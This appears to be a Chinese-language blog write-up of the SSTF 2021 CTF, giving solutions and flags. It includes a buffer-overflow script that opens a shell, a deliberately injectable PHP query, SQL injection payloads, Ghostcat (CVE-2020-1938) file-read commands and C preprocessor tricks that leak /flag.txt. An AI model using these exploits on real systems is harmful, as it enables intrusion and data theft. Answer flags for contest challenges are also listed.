---
title: "SSCTF2021 Wp"
slug: "ssctf2021-wp"
description: "时隔大半个月之后的复现 总之就是非常非常菜"
date: 2021-09-05T11:09:54+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

https://research.samsung.com/sstf

https://playground.sstf.site/challenges

## Tutorial/Practice: Flag Submission

`SCTF{It_15_tim3_t0_hack!!}`

## Tutorial/BOF 101

https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261&authkey=%21AO4uYzudT40Rn_Y&em=2

![image-20210816204446737](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816204446737.png)

`SCTF{n0w_U_R_B0F_3xpEr7}`

## Tutorial/BOF 102

https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251&authkey=%21AMhDJ94NiXLWqYs&em=2

```python
from telnetlib import Telnet

tn = Telnet("bof102.sstf.site", 1337)
tn.read_until(b"Name > ")
tn.write(b"/bin/sh" + b"\n")
payload = b'A'*20
payload += b'\xe0\x83\x04\x08'
payload += b'C'*4
payload += b'\x34\xa0\x04\x08'

tn.read_until(b" > ")
tn.write(payload + b'\n')
tn.interact()
```

`SCTF{B0F_A774ck_w1Th_arg5_1n_x86}`

## Tutorial/SQLi 101

https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257&authkey=%21ALtIE_cNe-XDn2o&em=2

![image-20210816201332616](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816201332616.png)

`SCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}`

## Tutorial/SQLi102

https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260&authkey=%21AGPulJniPCbx8v4&em=2

```php
<?php
include "./config.php";
$succ = -1;
if($_GET['showsrc']) {
    show_source("step1.php");
    die;
}
if($_GET['searchkey']) {
    $succ = 0;
    $query = "select * from books where title like '%".$_GET['searchkey']."%'";
    $db = dbconnect("sqli102_step3");
    $result = mysqli_query($db,$query);
    mysqli_close($db);
    if($result) {
        $rows = mysqli_num_rows($result);
    }
}

?>
```

`SCTF{b451c_SQLi_5k1lls}`

## Tutorial/RC four

https://www.geeksforgeeks.org/rc4-encryption-algorithm/

https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253&authkey=%21AOekQp-wZMxDdfA&em=2

## Tutorial/RSA 101

https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256&authkey=%21ANLCkvPBdXSb8Ko&em=2



## Web/SW Expert Academy

> Are you poor at algorithm coding? Here is amazing platform to enhance your coding skill!

![image-20210816213453433](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816213453433.png)

好家伙，梦回学c语言的时候，看到这个骰子的概率又能梦回高三数学的概率部分

![image-20210816233522899](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816233522899.png)

但是捏，它并不需要你具体写出来code，标答已经给出（虽然我憨憨的一开始没发现自己还写了一份）

```c
int a[12];for(int i=0;i<12;i++)scanf("%d",a+i);int ans=0;int mod=36;for(int i=0;i<6;i++)for(int j=6;j<12;j++)if(a[i]>a[j])ans++;for(int i=2;i<36;i++)while(ans>=i&&ans%i==0&&mod%i==0)ans/=i,mod/=i;printf("%d/%d",ans,mod);
```

当然直接访问/flag.txt又是不可以的

![image-20210817001655162](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210817001655162.png)

问题就转化为了如何在输出为符合样例要求的标准输出的情况下还能打印一份地址已知的flag.txt出来

由于gcc既能编译c也可以编译c++，这里用import来绕过对include的限制；而对于#的绕过可以参见->[Digraphs and trigraphs](https://en.wikipedia.org/wiki/Digraphs_and_trigraphs)

```c++
??=import "/flag.txt"
%:import "/flag.txt"
```

相当于[#import "/flag.txt"](https://en.wikipedia.org/wiki/Digraphs_and_trigraphs)，从gcc编译时的报错信息可以得到flag

或者用反斜杠+换行的形式

```c
??=incl\
ude "/flag.txt"
```

也可以绕过对include的过滤

`SCTF{take-care-when-execute-unknown-code}`

————类似的题之前做过一个[[FireshellCTF2020]Caas](https://imagin.vip/?p=1063#CaaS)，也是预处理遍历报错出flag

————在看了[别的师傅的wp](https://zhuanlan.zhihu.com/p/401197671)之后看到了另一种解法，从未设想过的道路

## Web/Poxe Center

> how to get legendary poxemon?

看了[wp](https://github.com/theori-io/ctf/blob/master/2021/SSTF2021/SSTF%202021%20The%20Duck%20-%20Write%20Up%20-%20rev%201.pdf)，直接sqlmap一把梭

![image-20210904145411586](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904145411586.png)

不过官方的预期解wp更复杂一些：

先爆目录/docs/

![image-20210904152658881](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904152658881.png)

这个版本下有[CVE-2020-1938 - Ghostcat](https://www.chaitin.cn/zh/ghostcat)，相关文章参考->[不调试源码重现 Ghostcat 漏洞 (CVE-2020-1938)](https://paper.seebug.org/1147/)

使用[公开的poc](https://github.com/hypn0s/AJPy)读一下配置文件，之后将class反编译获得java源文件（官方poc精简了一些内容 不过大差不差）

```
python poc.py -p 31811 -f "/WEB-INF/web.xml" 127.0.0.1
python poc.py -p 31811 -f "/WEB-INF/classes/com/samsung/sctf/MainController.class" 127.0.0.1
python poc.py -p 31811 -f "/WEB-INF/classes/com/samsung/sctf/gochaMapper.class" 127.0.0.1
python poc.py -p 31811 -f "/WEB-INF/demo/WEB-INF/classes/mapper/gochaMapper.xml" 127.0.0.1
```

/WEB-INF/classes/mapper/gochaMapper.xml是这样的

![image-20210904163606221](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904163606221.png)

这里的sortName和sortFlag直接拼接进sql语句中没有过滤，尝试sqli

```
sortName=(case%20when%20(select%20true)%20then%20BID%20else%20%270%27%20end)&sortFlag=desc
sortName=(case when (select true) then poke_name else '0' end)&sortFlag=asc
```

```
sortName=(case%20when%20(select%20false)%20then%20BID%20else%20%270%27%20end)&sortFlag=desc
sortName=(case when (select false) then poke_name else '0' end)&sortFlag=asc
```

```
sortName=random())dummy UNION SELECT'A','B','C','D','D','F',now(),'G','H','I' FROM(SELECT 1
sortFlag=NULL
```

```
sortName=random())dummy UNION SELECT DD."index",DD."name",DD.first_attribute,DD.second_attribute,'XX','XX',now(),'XX','XX','XX' FROM( SELECT * from poke_info
sortFlag=""
```

`{G0tcH4_Gh0sT_c4t_iS_L3G3ND4Ry_P0k3}`

## Misc/meLorean

> There was a crazy Data Scientist who rectilinearly claimed mathematics can make miracles.
> He left a note and then disappeared. Help to decode it.

给出了一个这样的文件，充满了二维坐标

![image-20210904143738246](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904143738246.png)

一个线性回归的相关问题，需要用到python中的sklearn.linear_model进行数据处理

```python
import ast
from sklearn.linear_model import LinearRegression
r = LinearRegression()
flag = []

with open("dataset.txt", "r") as f:
    for l in f:
        l = ast.literal_eval(l)
        X = [[i[0]] for i in l]
        y = [i[1] for i in l]
        r.fit(X, y)
        flag.append(chr(int(round(r.coef_[0]))))

print("".join(flag))
```

`SCTF{Pr0gre55_In_R3gr3ss}`

## ADBaby

是在[看wp](https://github.com/theori-io/ctf/blob/master/2021/SSTF2021/SSTF%202021%20The%20Duck%20-%20Write%20Up%20-%20rev%201.pdf)的时候注意到的题，看了个大概流程（其实只是眼熟adb而已 菜鸡 别骂了），所以下面就是大概翻译一下wp，很水

先连接上`adb connect adbaby.sstf.site:6666`，发现这是一个魔改过的adb，屏蔽了shell和主要功能，但是可以使用push/pull，属于文件管理类的命令（全部指令参见->[你确定已经掌握了adb的使用？](https://www.jianshu.com/p/839c04b7e1e3)

`adb pull /proc/self/exe adbaby`拿到文件用IDA进行分析，可以看到flag的路径在/data/local/tmp/flag处，但直接用adb pull是不可达的，因为对`./`, `../`, `data`, `local`, `tmp`, `flag`这些字眼进行了过滤

有一个自定的service名为adb Flag Service，对输入的密码进行检查，md5后开头是0123456的话就可以拿到flag，用脚本跑一下 415349420009

```python
from adb import adb_commands
device = adb_commands.AdbCommands()
device.ConnectDevice(serial='adbaby.sstf.site:6666')
conn = device.protocol_handler.Open(device._handle, b'flag:')
def sendafter(*args):
	print(device.protocol_handler.InteractiveShellCommand(conn, *args).decode())
sendafter()
sendafter('415349420009')
```

`SCTF{Do_Uth1nk_th1s_1s_adb}`

